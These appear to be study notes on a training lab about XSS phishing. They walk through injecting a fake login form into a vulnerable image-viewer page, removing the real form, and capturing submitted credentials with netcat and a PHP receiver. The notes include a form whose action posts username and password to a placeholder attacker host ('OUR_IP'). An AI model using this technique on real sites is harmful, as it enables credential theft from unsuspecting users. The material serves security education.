# 1. What is XSS Phishing?

**Phishing** uses legitimate-looking information or interfaces to trick victims into providing sensitive information to an attacker.

In an XSS phishing scenario:

```text
Vulnerable Website
        ↓
      XSS
        ↓
Fake Login Form
        ↓
Victim enters credentials
        ↓
Credentials sent elsewhere
```

The important advantage for an attacker is **trust**.

Instead of sending someone to an obviously suspicious website, the fake login interface can appear **inside a legitimate vulnerable website**.

The module specifically describes fake login forms as a common XSS-phishing technique.

---

# 2. Why XSS Can Be Used for Phishing

XSS gives JavaScript control over the page being viewed by the victim.

That means JavaScript can potentially:

- Add HTML
    
- Modify existing HTML
    
- Remove elements
    
- Change page text
    
- Create forms
    
- Change the appearance of the page
    

This makes XSS useful for creating a convincing fake interface.

### Mental model

```text
                    XSS
                     │
                     ▼
              Modify webpage
                     │
          ┌──────────┼──────────┐
          ↓          ↓          ↓
       Add form   Remove UI   Change text
          │          │          │
          └──────────┼──────────┘
                     ↓
              Fake login page
```

---

# 3. Phishing Simulation

The module also points out a legitimate security use case:

An organization can use an XSS vulnerability in an authorized environment as part of a **phishing simulation** to evaluate employee security awareness.

The important distinction is:

```text
Authorized security simulation
            ≠
Unauthorized credential theft
```

---

# 4. XSS Discovery

The lab uses a vulnerable application at:

```text
/phishing
```

The application is an **online image viewer**.

The user supplies an image URL, and the application displays the image.

The example request looks conceptually like:

```text
/phishing/index.php?url=<IMAGE_URL>
```

Therefore, the interesting input is:

```text
url=
```

---

# 5. First XSS Test

The basic test payload used earlier is tried:

```html
<script>alert(window.origin)</script>
```

However, in this application, it does **not** execute.

Instead, the application displays a broken/dead image indicator.

### Important lesson

This demonstrates something we've already seen:

> **A payload that works in one XSS context may fail completely in another.**

Therefore, don't assume:

```text
<script>alert(...)...</script>
```

will work everywhere.

---

# 6. Investigating the Injection Context

The module recommends examining how the input appears in the HTML source.

This is an extremely important XSS methodology:

```text
Input
 ↓
Where is it placed?
 ↓
What HTML context?
 ↓
What JavaScript/HTML behavior is possible?
 ↓
Choose an appropriate test
```

The lab explicitly tells you to inspect the HTML source to determine what type of payload can work.

---

# 7. 🖼️ XSS Phishing Attack Flow

![Image](https://images.openai.com/static-rsc-4/YpuWDwf3-s0R6FueJqeTOUrzmHP5nD3d41vuinZ_SdY944qhi8R8f8LzvmaYnd5DVqhrqNSmCKBC1hh1xyrfRQrRd_OScZ9KANq9mDUcnF73LMz0LyJtI4c144FqlddLaPiT9y-oQwv6_1XS-7Rm0kbG84QuE0q8E23ljLZAjRcKT8lVdVF37M4SJDXe3q9X?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/Eem0FpkRQzUQxng_Ff0PubzpVRYxk03XifhF_Y1HxWhgoVWCYj-OSPDBPjSkuFQ5BbsUgbYSPnJZwLrFqZjHmfhdfwHS42S3mwVbTSlBhi7lbXLC_VI4DCQKoGK56atUn28hBL89Y5Su4Kl23bbfOmiuMqymV6S0tFNKv9l5KkcXBBwgUJVF-8eGEUG3JPCA?purpose=fullsize)

![Image](https://images.openai.com/static-rsc-4/eWWp62tlTRZ6OWOWVlfh0NJS7ZEJ7IV0hhN9N-8zlo9RhJRfETzGaxfz08MUhIjxhThx4yhANcEySujdMQ3wJUMJCs7h87PzTrjnTtjUZ0vFJBiVVAu1tn4phzvXRqpXIBt0DDm8K5rMWC5YcNlR5j__skYPbIjL3JQonQLAmRMfjwlzAGHw39iWc5L-YylD?purpose=fullsize)

The complete concept is:

```text
        Vulnerable Web Application
                    │
                    ▼
                Reflected XSS
                    │
                    ▼
             Malicious URL
                    │
                    ▼
             Victim opens URL
                    │
                    ▼
           JavaScript executes
                    │
                    ▼
            Fake login form
                    │
                    ▼
         Victim enters credentials
                    │
                    ▼
       Authorized lab receiver/server
```

---

# 8. Login Form Injection

Once a working XSS payload has been identified, the lab moves to creating a fake login form.

The form contains:

- Username field
    
- Password field
    
- Login button
    

The basic HTML structure is:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

The important concept is the form's:

```html
action=
```

which determines where the browser submits the form.

---

# 9. Understanding the Fake Form

Conceptually:

```text
┌─────────────────────────────┐
│   Please login to continue  │
│                             │
│ Username: [______________]  │
│ Password: [______________]  │
│                             │
│          [ Login ]          │
└─────────────────────────────┘
```

The visual appearance is designed to resemble a legitimate authentication prompt.

---

# 10. Finding Your Lab IP

The module uses the attacker's lab machine IP as the destination for the form.

It recommends using:

```bash
ip a
```

and identifying the IP associated with the lab VPN interface, such as `tun0`.

For an authorized lab, think:

```text
Victim browser
      ↓
Fake form
      ↓
Your lab machine
```

---

# 11. Using `document.write()`

The module uses:

```javascript
document.write()
```

to inject HTML into the vulnerable page.

The conceptual operation is:

```javascript
document.write('<HTML CONTENT>');
```

So the JavaScript performs:

```text
XSS
 ↓
JavaScript executes
 ↓
document.write()
 ↓
HTML inserted
 ↓
Fake login form displayed
```

The lab's complete `document.write()` example is provided in the source material.

---

# 12. Why the HTML Is Minified

The module converts the multi-line HTML into a single line before placing it inside the JavaScript string.

For example:

```html
<h3>...</h3>
<form>
...
</form>
```

becomes conceptually:

```html
<h3>...</h3><form>...</form>
```

This makes it easier to place inside:

```javascript
document.write('...');
```

---

# 13. Reflected XSS Delivery

The lab uses **Reflected XSS**.

This means the malicious JavaScript isn't permanently stored in the application.

Instead:

```text
Malicious URL
      ↓
Victim visits URL
      ↓
Server processes parameter
      ↓
Payload reflected
      ↓
Browser executes JavaScript
```

This is exactly why the attacker needs a URL containing the XSS payload.

The module describes copying the malicious URL and using its parameter to deliver the payload.

---

# 14. 🧹 Cleaning Up the Page

After injecting the fake form, the original image viewer's URL input remains visible.

That makes the phishing page less convincing.

So the lab demonstrates removing the original form.

This teaches another important XSS concept:

> **XSS isn't limited to adding content — JavaScript can also remove existing DOM elements.**

---

# 15. Finding an Element's ID

The lab uses Firefox's **Page Inspector Picker**.

Shortcut:

```text
CTRL + SHIFT + C
```

Then select the element you want to inspect.

The original form has:

```html
id='urlform'
```

The relevant structure is:

```html
<form role="form" action="index.php" method="GET" id='urlform'>
```

The module uses this ID to target the element.

---

# 16. Removing the Existing Form

JavaScript provides:

```javascript
document.getElementById('urlform').remove();
```

Conceptually:

```text
document
   ↓
find element
   ↓
id = urlform
   ↓
remove()
   ↓
Element disappears
```

The lab uses this to remove the original image URL form.

---

# 17. Combining JavaScript Operations

The lab combines:

```text
document.write()
        +
document.getElementById().remove()
```

Conceptually:

```text
1. Add fake login interface
              ↓
2. Remove original interface
              ↓
3. Leave only the convincing login page
```

This demonstrates how multiple DOM operations can be chained together.

---

# 18. HTML Comments for Cleanup

The module notes that some original HTML can remain after the injected content.

It demonstrates using an HTML comment:

```html
<!--
```

to prevent the remaining HTML from being interpreted normally.

### Concept

```text
Injected content
       ↓
HTML comment begins
       ↓
Remaining original HTML
       ↓
Ignored as comment
```

This is another example of why understanding the **exact injection position** matters.

---

# 19. Final Appearance

After the DOM has been manipulated, the page can appear as though it legitimately requires authentication.

Conceptually:

```text
Before:

┌───────────────────────────┐
│ Image URL: [___________]  │
│                           │
│        [Display]          │
└───────────────────────────┘


After XSS:

┌───────────────────────────┐
│ Please login to continue  │
│                           │
│ Username: [___________]   │
│ Password: [___________]   │
│                           │
│          [Login]          │
└───────────────────────────┘
```

The module then describes delivering the resulting URL in the authorized lab scenario.

---

# 20. Credential Capture — Lab Concept

The final part demonstrates what happens when someone submits the fake form.

The form sends its fields to the configured destination.

Conceptually:

```text
Username
Password
   ↓
HTML form submission
   ↓
HTTP request
   ↓
Lab listener
```

The module uses `netcat` to demonstrate what the request looks like.

---

# 21. Understanding the HTTP Request

In the lab, submitting:

```text
test:test
```

produces a request conceptually like:

```http
GET /?username=test&password=test&submit=Login HTTP/1.1
```

The important part is:

```text
username=test
password=test
```

This demonstrates that HTML form data can be transmitted as URL parameters when the form uses a GET request.

---

# 22. Why `netcat` Isn't Enough

The module points out that a simple `netcat` listener can receive the request but doesn't properly behave like a web application.

Therefore, the victim may see:

```text
Unable to connect
```

That could make the phishing page look suspicious.

In the lab, the next step is therefore to use a simple PHP server that can:

1. Receive the request.
    
2. Record the submitted lab credentials.
    
3. Redirect the browser back to the original page.
    

The source describes this behavior explicitly.

---

# 23. PHP Receiver — What It Demonstrates

The lab PHP example checks whether the request contains:

```text
username
password
```

Then records those values and redirects the browser.

Conceptually:

```text
HTTP request
     ↓
PHP receives parameters
     ↓
Check username/password
     ↓
Write to lab file
     ↓
Redirect browser
```

The module's example stores them in `creds.txt`.

**For real-world security work, don't log actual user passwords; use dummy credentials in a controlled lab.**

---

# 24. Starting the PHP Lab Server

The module creates a temporary directory:

```bash
mkdir /tmp/tmpserver
```

Then:

```bash
cd /tmp/tmpserver
```

After creating the PHP receiver:

```bash
sudo php -S 0.0.0.0:80
```

The result is a simple PHP development server listening on port 80.

---

# 25. Lab Result

When the test credentials are submitted, the browser is redirected to the original image viewer.

The lab then checks:

```bash
cat creds.txt
```

and sees the dummy credentials that were submitted.

This proves the complete phishing chain worked **inside the controlled lab**.

---

# 26. 🧠 Complete Attack Chain

This is the most important diagram to remember:

```text
                 XSS PHISHING
                      │
                      ▼
             Find XSS vulnerability
                      │
                      ▼
             Identify injection context
                      │
                      ▼
             Find working XSS payload
                      │
                      ▼
             Inject fake login HTML
                      │
                      ▼
              Modify original page
                      │
             ┌────────┴────────┐
             ↓                 ↓
       Add fake form      Remove real UI
             │                 │
             └────────┬────────┘
                      ↓
              Convincing page
                      │
                      ▼
               User submits
                      │
                      ▼
             Lab receiver gets
              submitted data
                      │
                      ▼
              Browser redirected
```

---

# 27. ⭐ Most Important Things

### 🔥 1. XSS can manipulate legitimate pages

JavaScript injected through XSS can modify the DOM and create convincing interfaces.

### 🔥 2. Payload choice depends on context

The initial `<script>` payload doesn't work in this application.

**Always inspect where your input lands.**

### 🔥 3. `document.write()` can insert HTML

The lab uses it to demonstrate injecting a login form.

### 🔥 4. DOM elements can be removed

For example:

```javascript
document.getElementById('urlform').remove();
```

### 🔥 5. Reflected XSS can be delivered through URLs

Because the payload is reflected rather than permanently stored.

### 🔥 6. Form submission can transmit parameters

With a GET form, values can appear in the request URL:

```text
?username=...
&password=...
```

### 🔥 7. `netcat` can demonstrate HTTP requests

It's useful for observing what the browser sends, but it isn't a full HTTP application.

### 🔥 8. A server-side handler can process requests

The lab uses PHP to demonstrate receiving the submitted test values and redirecting the browser.

---

# 🧩 XSS Phishing Quick Revision

|Concept|Remember|
|---|---|
|**Phishing**|Trick users into providing sensitive information|
|**XSS Phishing**|Use XSS to modify a trusted webpage|
|**Injection**|Insert fake HTML/JavaScript|
|`document.write()`|Writes content to the document|
|`getElementById()`|Finds a specific DOM element|
|`.remove()`|Removes an element|
|**Reflected XSS**|Payload delivered through a request/URL|
|**GET form**|Form values can appear in the URL|
|**Netcat**|Useful for observing incoming requests|
|**PHP server**|Can process HTTP requests in the lab|
|**Cleanup**|Remove/modify original page elements|
|**Verification**|Use dummy credentials in an authorized environment|

---

# 🧠 One-Line Memory Trick

> **XSS Phishing = Find XSS → inject a convincing interface → manipulate the DOM → have the lab user submit dummy data → observe the HTTP request.**

The most important lesson isn't the individual payloads—it's understanding **how XSS turns control of a webpage into control over what the user sees and interacts with**.